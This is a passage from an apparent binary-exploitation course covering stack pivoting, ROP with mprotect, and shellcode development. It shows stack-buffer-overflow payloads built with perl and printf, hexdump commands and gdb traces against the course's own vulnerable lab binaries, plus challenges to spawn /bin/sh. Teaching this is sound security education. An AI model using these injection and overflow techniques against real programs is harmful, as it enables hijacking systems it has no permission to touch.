</span></span><span style=display:flex><span><span style=color:#000>sh</span> <span style=color:#ce5c00;font-weight:700>=</span> <span style=color:#204a87>next</span><span style=color:#000;font-weight:700>(</span><span style=color:#000>libc</span><span style=color:#ce5c00;font-weight:700>.</span><span style=color:#000>search</span><span style=color:#000;font-weight:700>(</span><span style=color:#4e9a06>b</span><span style=color:#4e9a06>&#34;/bin/sh</span><span style=color:#4e9a06>\x00</span><span style=color:#4e9a06>&#34;</span><span style=color:#000;font-weight:700>))</span>
</span></span></code></pre></div></blockquote><p>Call <code>system</code>.</p><h3 id=03-challenge---stack-pivoting>03. Challenge - Stack Pivoting</h3><p>Let&rsquo;s assume that <code>main</code> function had additional constraints that made it impossible to repeat the overflow. How can we still solve it? The method is called stack pivoting. In short, this means making the stack pointer refer another (writable) memory area that has enough space, a memory area that we will populate with the actual ROP chain.</p><blockquote><p>Read more about stack pivoting <a href=http://neilscomputerblog.blogspot.ro/2012/06/stack-pivoting.html>here</a>.</p></blockquote><p>Tour goal is to fill the actual ROP chain to a large enough memory area. We need a two stage exploit:</p><ul><li>In the first stage, prepare the memory area where to fill the second stage ROP chain; then fill the memory area with the second stage ROP chain.</li><li>In the second stage, create the actual ROP chain and feed it to the program and profit.</li></ul><p>Follow the steps below.</p><p>Use pmap or vmmap in <code>pwndbg</code> to discover the writable data section of the process. Select an address in that section (<strong>don&rsquo;t</strong> use the start address). This is where you fill the 2nd stage data (the actual ROP chain).</p><blockquote><p>Who not use the start address? Because <code>pop</code> instructions (which decrease the <code>rsp</code>) will go outside the memory region.</p></blockquote><p>Create a first stage payload that calls <code>read</code> to store the 2nd stage data to the newly found memory area. After that pivot the stack pointer to the memory area address.</p><blockquote><p>At a given address in the executable you have a call to <code>read</code> followed by a <code>leave; ret</code> gadget. This sequence of instructions allows you to read data and then pivot the stack.</p><p>The leave instruction fills the stack pointer (<code>rsp</code>) with the address of the frame pointer (<code>rbp</code>). It&rsquo;s equivalent to:</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#000>mov</span> <span style=color:#000>rsp</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>rbp</span>
</span></span><span style=display:flex><span><span style=color:#000>pop</span> <span style=color:#000>rbp</span>
</span></span></code></pre></div></blockquote><p>Write the actual ROP chain as a second stage payload like when we didn&rsquo;t have space constraints. The 2nd stage will be stored to the memory area and the stack pointer will point to that.</p><blockquote><p><strong>Important!</strong> Be careful when and where the stack pivoting takes place. After the <code>mov rsp, rbp</code> part of the <code>leave</code> instruction happens your stack will be pivoted, so the following <code>pop rbp</code> will happen <strong>on the new stack</strong>. Take this offset into account when building the payload.</p></blockquote><h3 id=04-challenge---mprotect>04. Challenge - mprotect</h3><p>Combine everything you&rsquo;ve learned until now and develop a complex payload to call <code>mprotect</code> to change the permissions on a memory region to read+write+execute and then instert a <em>shellcode</em> to call <code>system("/bin/sh")</code>.</p><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://syscalls.kernelgrok.com/>https://syscalls.kernelgrok.com/</a></li><li><a href=http://articles.manugarg.com/systemcallinlinux2_6.html>http://articles.manugarg.com/systemcallinlinux2_6.html</a></li><li><a href=https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries#the-procedure-linkage-table-plt>https://eli.thegreenplace.net/2011/11/03/position-independent-code-pic-in-shared-libraries#the-procedure-linkage-table-plt</a></li><li><a href=https://github.com/Gallopsled/pwntools-tutorial/tree/master/walkthrough>https://github.com/Gallopsled/pwntools-tutorial/tree/master/walkthrough</a></li></ul></div><div class=td-content style=page-break-before:always><h1 id=pg-1b36084800b7f3c799b8474a184cbf0c>9 -</h1><details open><summary>Table of contents</summary><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#stack-buffer-overflow-recap>Stack-buffer-overflow recap</a></li><li><a href=#code-injection>Code injection</a><ul><li><a href=#develop>Develop</a></li><li><a href=#inject>Inject</a></li><li><a href=#trigger>Trigger</a></li></ul></li><li><a href=#shellcodes>&ldquo;Shellcodes&rdquo;</a></li></ul></li><li><a href=#tutorials>Tutorials</a><ul><li><a href=#01-tutorial-generating-machine-code>01. Tutorial: generating machine code</a></li><li><a href=#02-tutorial-inspecting-machine-code>02. Tutorial: inspecting machine code</a></li><li><a href=#03-tutorial-feeding-machine-code-to-a-program>03. Tutorial: feeding machine code to a program</a></li><li><a href=#04-tutorial-hello-world-shellcode>04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode</a></li><li><a href=#05-tutorial-debugging-shellcodes>05. Tutorial: Debugging shellcodes</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#06-challenge-binsh-shellcode>06. Challenge: /bin/sh shellcode</a></li><li><a href=#07-challenge-shellcode-on-stack>07. Challenge: shellcode on stack</a></li><li><a href=#08-challenge-shellcode-after-saved-ret>08. Challenge: shellcode after saved ret</a></li><li><a href=#09-challenge-shellcode-after-saved-ret---no-leak>09. Challenge: shellcode after saved ret - no leak</a></li><li><a href=#10-challenge-shellcode-as-command-line-arg>10. Challenge: shellcode as command line arg</a></li><li><a href=#11-challenge-shellcode-in-the-environment>11. Challenge: shellcode in the environment</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li><li><a href=#resources>Resources</a></li></ul></details><h1 id=introduction>Introduction</h1><h2 id=stack-buffer-overflow-recap>Stack-buffer-overflow recap</h2><p>In the last session, we studied what an attacker can do to a program with a stack-buffer-overflow vulnerability: fill up the legitimately reserved space with junk, then overwrite the saved-return value with an address of their choosing. After the vulnerable function&rsquo;s execution ends, its final <code>ret</code> will place the attacker&rsquo;s chosen address into the <code>eip</code>/<code>rip</code> and execution will continue from there.</p><img src=./assets/stack_buffer.png width=600><p>The above scenario limits the attacker to the functionality already present in the vulnerable program. If an attacker desires to spawn a shell, but no shell-spawning code is already present - tough luck! In this session we will start studying a method of overcoming this limitation: code injection.</p><h2 id=code-injection>Code injection</h2><p>If the code we want to execute is not present in the target program, we&rsquo;ll simply add it ourselves! We will implement our desired functionality in machine code, inject (which is just a fancy word for &ldquo;write&rdquo;) it into the target process&rsquo; memory, then force execution to jump to the beginning of our code. These steps can be succinctly summarized as: develop, inject, trigger.</p><h3 id=develop>Develop</h3><p>First, we need to implement our desired functionality. Our goal is to obtain <em>something</em> that can be placed directly into the memory space of a running process and be executed; so it cannot be text representing code in C, Python, Java etc. It must be <em>machine code</em>. This might seem a very difficult task, but we&rsquo;ll simply use the tools we usually employ when writing code that we intend to run; in particular, we will rely on the assembler: we write ASM code to do what we want, then assemble it to obtain a string of machine code bytes.</p><h3 id=inject>Inject</h3><p>Once we have our string of machine code bytes, we need it to be present in the memory space of the target process. This means the program must read some input (with a <code>gets</code>, <code>fgets</code>, <code>fscanf</code>, <code>read</code> etc.). However, if we can <em>launch</em> the program, we can also place our code in the environment or inside a command line argument; even if a program doesn&rsquo;t use these, the loader still places them in its address space.</p><h3 id=trigger>Trigger</h3><p>After having placed our code inside the memory space of the target process, we need to force execution to jump at its beginning. We already know how to do this, by means of a stack-buffer-overflow, which we studied in the previous session.</p><h2 id=shellcodes>&ldquo;Shellcodes&rdquo;</h2><p>Usually, the end-goal of an attacker is to force the program to spawn a shell, thus gaining unlimited access. This can be achieved by injecting machine code that triggers an <code>execve("/bin/sh", ["/bin/sh", NULL], NULL)</code> system call, hence the name &ldquo;shellcode&rdquo;. However, this label is also used for any piece of injected code, even if it does not spawn a shell.</p><h1 id=tutorials>Tutorials</h1><h2 id=01-tutorial-generating-machine-code>01. Tutorial: generating machine code</h2><p>To address the first step of our code injection technique, we will start with a simple example: we want to force the program to end cleanly with an exit code of 42; more precisely we want to execute an <code>exit(42)</code> system call.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#204a87;font-weight:700>BITS</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>42</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>60</span>
</span></span><span style=display:flex><span>    <span style=color:#000>syscall</span>
</span></span></code></pre></div><p><a href=http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>Linux Syscall Table</a></p><p>We can then use <code>nasm</code> to obtain a file with machine code:</p><pre tabindex=0><code>$ nasm exit_shellcode.nasm -o exit_shellcode.bin
</code></pre><p><strong>NOTE:</strong> <code>exit_shellcode.bin</code> is not an ELF:</p><pre tabindex=0><code>$ file exit_shellcode.bin
exit_shellcode.bin: data
</code></pre><p>It is not an executable file at all, but simply contains a raw string of machine code bytes. You can see that it is very, very small:</p><pre tabindex=0><code>$ wc --bytes exit_shellcode.bin
12 exit_shellcode.bin
</code></pre><h2 id=02-tutorial-inspecting-machine-code>02. Tutorial: inspecting machine code</h2><p>We would also like to be able to do the reverse of this: given a file that contains a raw string of machine bode bytes, translate it back into readable assembly. This is useful to check that our assembly process was correct, as well as for analyzing files that we did not create.</p><p>In <a href=../exploration-tools>the first session</a>, we learned to disassemble using <code>objdump</code>. By default, <code>objdump</code> expects a proper <code>ELF</code> executable and complains about our raw file:</p><pre tabindex=0><code>$ objdump -d -M intel exit_shellcode.bin
objdump: exit_shellcode.bin: file format not recognized
</code></pre><p>We need to use the following command:</p><pre tabindex=0><code>$ objdump -D -b binary -m i386:x86-64 -M intel exit_shellcode.bin

test.bin:     file format binary


Disassembly of section .data:

0000000000000000 &lt;.data&gt;:
   0:   48 c7 c0 ff ff ff ff    mov    rax,0xffffffffffffffff
   7:   bf 2a 00 00 00          mov    edi,0x2a
   c:   b8 3c 00 00 00          mov    eax,0x3c
  11:   0f 05                   syscall
</code></pre><ul><li><code>-D</code>: disassemble all, not only text/code zones. In our case this means disassemble the whole file.</li><li><code>-b binary</code>: treat the file as not having a specific object/executable format (such as ELF, COFF, Mach-O or PE).</li><li><code>-m i386:86-64</code>: the machine code inside the binary file is i386 (x86), 64 bits (usually, <code>objdump</code> gets this information from the ELF header).</li><li><code>-M intel</code>: display ASM using Intel assembly syntax, as opposed to AT&T assembly syntax.</li></ul><p>We can also use a tool like <code>xxd</code> or <code>hexdump</code> to inspect the byte values in the file, without dissasembling:</p><pre tabindex=0><code>$ xxd exit_shellcode.bin
00000000: 48c7 c0ff ffff ffbf 2a00 0000 b83c 0000  H.......*....&lt;..
00000010: 000f 05                                  ...
</code></pre><h2 id=03-tutorial-feeding-machine-code-to-a-program>03. Tutorial: feeding machine code to a program</h2><p>Now that we know how to obtain a bytestring of machine code from an assembly program, it&rsquo;s time to move on to the next step: injection. The simplest way is to redirect the <code>stdin</code> of the target program to the file containing our raw machine code.</p><pre tabindex=0><code>$ ./vuln &lt; exit_shellcode.bin
</code></pre><p>However, we might want to freely edit the payload directly on the command line (for example, if the program reads some other stuff). The way to do this is to use another tool, like the shell itself, to transform hexdecimal notation into binary data:</p><pre tabindex=0><code>$ printf &#39;\x4b\x80\x04\x08&#39;
K�
</code></pre><p>Again, we can use a tool like <code>xxd</code> for the reverse operation, to verify that the binary data comes out as intended:</p><pre tabindex=0><code>$ printf &#39;\x4b\x80\x04\x08&#39; | xxd -p
4b800408
</code></pre><p>If our machine code is contained in a file, we can use <code>hexdump</code> to obtain an escaped hexadecimal representation of its contents:</p><pre tabindex=0><code>$ hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin
\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05
</code></pre><p>Which we can then combine with some other input</p><pre tabindex=0><code>$ printf &#39;1\x48\xc7\xc0\xff\xff\xff\xff\xbf\x2a\x00\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05&#39; | ./vuln2
</code></pre><p>Or we can do this directly:</p><pre tabindex=0><code>$ printf &#39;1&#39;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin) | ./vuln2
</code></pre><p>We can then verify that the program did indeed exit with code 42:</p><pre tabindex=0><code>$ echo $?
42
</code></pre><h2 id=04-tutorial-hello-world-shellcode>04. Tutorial: &ldquo;Hello, world!&rdquo; shellcode</h2><p>Our aim now is to develop a shellcode that prints <code>"Hello, world!\n"</code> to stdout, then inject it into <code>vuln</code> and trigger its execution.</p><p>We start by writing a shellcode that does a <code>write(1, "Hello, world!\n", 14)</code> system call, by writing the string on to the stack such that the stack pointer points to the beginning of the string.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nasm data-lang=nasm><span style=display:flex><span><span style=color:#8f5902;font-style:italic>; Write &#34;Hello, world!\n&#34; to the standard output.</span>
</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>BITS</span> <span style=color:#0000cf;font-weight:700>64</span>
</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>; We can&#39;t push 64 bit constants, but we can push 64 bit registers.</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>`orld!\n`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#204a87>rbx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rbx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#4e9a06>`Hello, w`</span>
</span></span><span style=display:flex><span>    <span style=color:#000>push</span> <span style=color:#204a87>rbx</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rsi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#204a87>rsp</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdx</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>14</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rdi</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span>    <span style=color:#000>mov</span> <span style=color:#204a87>rax</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>1</span>
</span></span><span style=display:flex><span>    <span style=color:#000>syscall</span>
</span></span></code></pre></div><p>This is just one way to do it and there are other possible approaches to it.</p><p>We then assemble our snippet to get a string of machine code bytes (the <code>Makefile</code> provided already does this).</p><pre tabindex=0><code>$ nasm hello_shellcode.nasm -o hello_shellcode.bin
</code></pre><p>Our vulnerable program first reads 128 bytes into a global buffer (line 8):</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>machine_code</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>128</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>Our shellcode-injecting payload needs to consist of the shellcode itself and some junk to pad the payload length to 128. First, we need to determine the shellcode size in bytes, then we use a tool like python to generate the string:</p><pre tabindex=0><code>$ wc -c hello_shellcode.bin
42 hello_shellcode.bin

$ perl -e &#34;print \&#34;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; ./hello_shellcode.bin)\&#34; . \&#34;A\&#34; x (128 - 42)&#34;
</code></pre><p>We then move on to the second part of our exploit, in which we hijack control flow by exploiting a stack-buffer-overflow in which 128 bytes are read into a 16 byte buffer.</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[</span><span style=color:#0000cf;font-weight:700>16</span><span style=color:#000;font-weight:700>];</span>
</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>...</span>
</span></span><span style=display:flex><span><span style=color:#000>read</span><span style=color:#000;font-weight:700>(</span><span style=color:#0000cf;font-weight:700>0</span><span style=color:#000;font-weight:700>,</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>,</span> <span style=color:#0000cf;font-weight:700>128</span><span style=color:#000;font-weight:700>);</span>
</span></span></code></pre></div><p>All we need to do is to pad the legitimately reserved space until the saved return address, then overwrite it with the address of <code>machine_code</code>. Thus we will probably need 16 + 8 (the saved <code>rbp</code>) bytes of padding, but remember that we can&rsquo;t rely on the layout we see in C and must inspect the binary:</p><pre tabindex=0><code>$ objdump -d -M intel ./vuln
...
0000000000401126 &lt;main&gt;:
  401126:       55                      push   rbp
  401127:       48 89 e5                mov    rbp,rsp
  40112a:       48 83 ec 10             sub    rsp,0x10    &lt;---- Here we see that there are, indeed, just 16 bytes reserved on this stack frame
...
</code></pre><p>We then determine the address of the global buffer which holds our code and craft our second payload (remember to reverse the bytes because our systems are little endian):</p><pre tabindex=0><code>$ nm ./vuln | grep machine_code
0000000000404060 T machine_code

$ perl -e &#39;print &#34;A&#34; x (16 + 8) . &#34;\x60\x40\x40\x00\x00\x00\x00\x00&#34;&#39;
</code></pre><p>Now all we need to do is concatenate our two payloads:</p><pre tabindex=0><code>$ perl -e &#34;print \&#34;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; ./hello_shellcode.bin)\&#34; . \&#34;A\&#34; x (128 - 42) . \&#34;A\&#34; x (16 + 8) . \&#34;\x60\x40\x40\x00\x00\x00\x00\x00\&#34;&#34; | ./vuln
Hello, world!
[1]    53760 done                              perl -e  |
       53762 segmentation fault (core dumped)  ./vuln
</code></pre><p>As you can see, even with simple exploits, payloads quickly become unwieldy. Our advice is to make use of a script in a language like python. There is one such script example in the task directory.</p><p>Even though we succeeded in printing our message, the program then ended abruptly with a <em>Segmentation fault</em>. Pause for a second to figure out why that is.</p><details><summary>Answer here</summary><p>Because we hijacked normal control flow, the program does not reach the end of the <code>main</code> function to terminate gracefully, but instead continues to attempt to execute instructions from the <code>machine_code</code> global var. We can help the program exit gracefully by extending our shellcode to also perform an <code>exit(0)</code> syscall after the <code>write</code>. Remember to check the size of the new shellcode and update the padding accordingly!</p></details><h2 id=05-tutorial-debugging-shellcodes>05. Tutorial: Debugging shellcodes</h2><p>How can we <strong>know</strong> that our shellcode worked properly? Sometimes its external effects are not immediately visible; if it involves any system calls, we can make use of <code>strace</code>:</p><pre tabindex=0><code>$ printf &#39;1&#39;$(hexdump -v -e &#39;&#34;\\&#34; 1/1 &#34;x%02x&#34;&#39; exit_shellcode.bin) | strace ./vuln2
execve(&#34;./vuln2&#34;, [&#34;./vuln2&#34;], 0x7ffdb027a9d0 /* 77 vars */) = 0
....
exit(42)                                = ?
+++ exited with 42 +++
</code></pre><p>A more productive approach is to use <code>gdb</code> to inspect the execution of the shellcode step by step. Load the program, break on the shellcode address, feed it the input and run:</p><details><summary>GDB output</summary><pre tabindex=0><code>$ gdb ./vuln
Reading symbols from ./vuln...
gdb-peda$ b *main+56
Breakpoint 1 at 0x40115e: file vuln.c, line 11.
gdb-peda$ r &lt; payload
Starting program: /home/mihai/gits/sss-exploit-internal/sessions/07-shellcodes/activities/04-tutorial-hello-world-shellcode/src/vuln &lt; payload
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)
RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&#39;A&#39; &lt;repeats 24 times&gt;, &#34;`@@&#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
RSP: 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48
RIP: 0x40115e (&lt;main+56&gt;:       ret)
R8 : 0x0
R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&lt;_start&gt;:        endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401153 &lt;main+45&gt;:  call   0x401030 &lt;read@plt&gt;
   0x401158 &lt;main+50&gt;:  mov    eax,0x0
   0x40115d &lt;main+55&gt;:  leave
=&gt; 0x40115e &lt;main+56&gt;:  ret
   0x40115f:    nop
   0x401160 &lt;__libc_csu_init&gt;:  endbr64
   0x401164 &lt;__libc_csu_init+4&gt;:        push   r15
   0x401166 &lt;__libc_csu_init+6&gt;:        lea    r15,[rip+0x2c93]        # 0x403e00
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd388 --&gt; 0x404060 --&gt; 0xa21646c726fbb48
0008| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
0016| 0x7fffffffd398 --&gt; 0x1f7fca000
0024| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)
0032| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900
0040| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)
0048| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8
0056| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040115e in main () at vuln.c:11
11      }
gdb-peda$ si
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x401160 (&lt;__libc_csu_init&gt;:       endbr64)
RCX: 0x7ffff7eb6052 (&lt;read+18&gt;: cmp    rax,0xfffffffffffff000)
RDX: 0x80
RSI: 0x7fffffffd370 (&#39;A&#39; &lt;repeats 24 times&gt;, &#34;`@@&#34;)
RDI: 0x0
RBP: 0x4141414141414141 (&#39;AAAAAAAA&#39;)
RSP: 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
RIP: 0x404060 --&gt; 0xa21646c726fbb48
R8 : 0x0
R9 : 0x7ffff7fdc070 (&lt;_dl_fini&gt;:        endbr64)
R10: 0xfffffffffffff4ac
R11: 0x246
R12: 0x401040 (&lt;_start&gt;:        endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40405a:    add    BYTE PTR [rax],al
   0x40405c:    add    BYTE PTR [rax],al
   0x40405e:    add    BYTE PTR [rax],al
=&gt; 0x404060 &lt;machine_code&gt;:     movabs rbx,0xa21646c726f
   0x40406a &lt;machine_code+10&gt;:  push   rbx
   0x40406b &lt;machine_code+11&gt;:  movabs rbx,0x77202c6f6c6c6548
   0x404075 &lt;machine_code+21&gt;:  push   rbx
   0x404076 &lt;machine_code+22&gt;:  mov    rsi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd390 --&gt; 0x7fffffffd40a --&gt; 0xd478000000000000
0008| 0x7fffffffd398 --&gt; 0x1f7fca000
0016| 0x7fffffffd3a0 --&gt; 0x401126 (&lt;main&gt;:      push   rbp)
0024| 0x7fffffffd3a8 --&gt; 0x7fffffffd859 --&gt; 0x54bcc0a1225a8900
0032| 0x7fffffffd3b0 --&gt; 0x401160 (&lt;__libc_csu_init&gt;:   endbr64)
0040| 0x7fffffffd3b8 --&gt; 0x352575cde5bb22d8
0048| 0x7fffffffd3c0 --&gt; 0x401040 (&lt;_start&gt;:    endbr64)
0056| 0x7fffffffd3c8 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000404060 in machine_code ()
gdb-peda$
</code></pre></details><h1 id=challenges>Challenges</h1><h2 id=06-challenge-binsh-shellcode>06. Challenge: /bin/sh shellcode</h2><p>You are given a piece of assembly code that attempts to spawn a shell with the aid of the <code>execve</code> syscall. However, the given code is buggy and it will not work. Your task is to figure out what&rsquo;s wrong with it and fix it.</p><h2 id=07-challenge-shellcode-on-stack>07. Challenge: shellcode on stack</h2><p>Up until now we have injected code into some memory area, then used a stack-buffer-overflow vulnerability to overwrite a saved return address and hijack control flow. If we think about it, the legitimately reserved buffer space on the stack <em>is</em> a memory area and we could perform our attack using a single read: the overflowing one.</p><p>So our payload will consist of the bytes in our shellcode, then some junk to pad the rest of the space to the saved return, then the address of the buffer itself:</p><img src=./assets/shellcode_below.png width=600><p>Now that our shellcode is written on the stack, things become a little harder. Due to several factors (such as the fact that environment variables and command line arguments are placed by the loader on the stack), it is difficult to predict the address at which any value will be placed on the stack. For now, the binary will generously print it for us.</p><p>You can observe the volatility of the stack by changing how you launch the program (rember that the path of the binary is considered a command line argument, namely <code>argv[0]</code> so it too gets placed on the stack, thus things change depending on what exact relative or absolute path we use):</p><pre tabindex=0><code>$ ./vuln
0x7fffffffd5d0
$ ../07-challenge-shellcode-on-stack/vuln
0x7fffffffd550
$ ./vuln asdf
0x7fffffffd5c0
$ ./vuln asdfqwer
0x7fffffffd5c0
$ ./vuln asdfqwerasdfqwer
0x7fffffffd5b0
$ ./vuln asdf qwer
0x7fffffffd5b0
$ FOO=bar ./vuln
0x7fffffffd5c0
</code></pre><h2 id=08-challenge-shellcode-after-saved-ret>08. Challenge: shellcode after saved ret</h2><p>In the previous challenge, we placed our shellcode on the stack, in the space between the overflown buffer&rsquo;s beginning and the saved return address. However, we could switch things up and place the shellcode in the area <em>after</em> the saved return address. This might be useful when the stack buffer is too short to hold our payload.</p><p>So our payload will consist of padding junk from the beginning of the buffer to the saved return, the address of the next stack portion, then the bytes of our shellcode.</p><img src=./assets/shellcode_above.png width=600><p>To recap: given a stack-buffer-overflow vulnerability we can not only hijack control flow, but also place a shellcode on the stack using the buggy read. There are two regions where we can do this:</p><ul><li>between the buffer start and the saved return. The number of bytes we can write here is determined by <em>how much space was allocated on the stack</em>.</li><li>after the saved return. The number of bytes we can write here is determined by <em>how many bytes are read</em>.</li></ul><p>If any of these regions is too small, we can try the other one. If both of them are too small, that&rsquo;s a problem. However, note that shellcodes are usually tiny.</p><h2 id=09-challenge-shellcode-after-saved-ret---no-leak>09. Challenge: shellcode after saved ret - no leak</h2><p>This is the same as the previous challenge, only this time the executable does not conveniently leak the buffer&rsquo;s address. So you will have to deal with the differences between running a binary inside and outside of <code>gdb</code> to precisely determine the necessary address, then jump to it.</p><h2 id=10-challenge-shellcode-as-command-line-arg>10. Challenge: shellcode as command line arg</h2><p>As mentioned in the introduction, reading from stdin or from a file isn&rsquo;t the only way to place content inside the memory space of a process. If we can launch the executable, we can modify its environment or command line arguments. The fact that a program might not use its arguments or environment is irrelevant, the loader can&rsquo;t know this, so it places them in the address space anyway.</p><p>Take the <code>/bin/sh</code> shellcode and feed it to the program as a command-line argument, then exploit the SBO to actually run it.</p><h2 id=11-challenge-shellcode-in-the-environment>11. Challenge: shellcode in the environment</h2><p>Take the <code>/bin/sh</code> shellcode and place it in the environment, then exploit the SBO to actually run it.</p><h1 id=further-reading>Further Reading</h1><p><a href=http://phrack.org/issues/49/14.html>&ldquo;Smashing The Stack For Fun And Profit&rdquo;, Aleph One</a> - a legendary attack paper documenting SBOs and shellcodes. As it is written in &lsquo;96, the examples in it will probably <em>not</em> work (either out-of-the-box or with some tweaks). We recommend perusing it for its historical/cultural significance, but don&rsquo;t waste much time on the technical details of the examples.</p><h1 id=resources>Resources</h1><p><a href=http://shell-storm.org/shellcode/>Shell-storm</a> - a repository of shellcodes.</p></div><div class=td-content style=page-break-before:always><h1 id=pg-a0bf900fea717e3b3dea6108bd6921e3>10 -</h1><details open><summary>Table of contents</summary><ul><li><a href=#introduction>Introduction</a></li><li><a href=#tutorials>Tutorials</a><ul><li><a href=#01-tutorial-preventing-stack-operations-from-overwriting-the-shellcode>01. Tutorial: preventing stack operations from overwriting the shellcode</a></li><li><a href=#02-tutorial-nop-sleds>02. Tutorial: NOP sleds</a></li><li><a href=#03-tutorial-null-free-shellcodes>03. Tutorial: null-free shellcodes</a></li><li><a href=#04-tutorial-shellcodes-in-pwntools>04. Tutorial: shellcodes in pwntools</a></li><li><a href=#05-tutorial-alphanumeric-shellcode>05. Tutorial: alphanumeric shellcode</a></li></ul></li><li><a href=#challenges>Challenges</a><ul><li><a href=#06-challenge-nop-sled-redo>06. Challenge: NOP sled redo</a></li><li><a href=#07-challenge-no-nops-allowed>07. Challenge: No NOPs allowed!</a></li><li><a href=#08-challenge-multiline-output>08. Challenge: multiline output</a></li><li><a href=#09-challenge-execve-blocking-attempt>09: Challenge: execve blocking attempt</a></li></ul></li><li><a href=#further-reading>Further Reading</a><ul><li><a href=#input-restrictions>Input restrictions</a></li></ul></li></ul></details><h1 id=introduction>Introduction</h1><p>In <a href=../shellcodes>the previous session</a>, we learned about <strong>shellcodes</strong>, a form of <strong>code injection</strong> which allowed us to hijack the control flow of a process and make it do our bidding. The three steps for a succesful shellcode attack are:</p><ul><li><strong>develop</strong>: obtain the machine code for the desired functionality</li><li><strong>inject</strong>: place the shellcode into the process&rsquo; address space</li><li><strong>trigger</strong>: divert control flow to the beginning of our shellcode</li></ul><p>The first step seems pretty straightforward, but 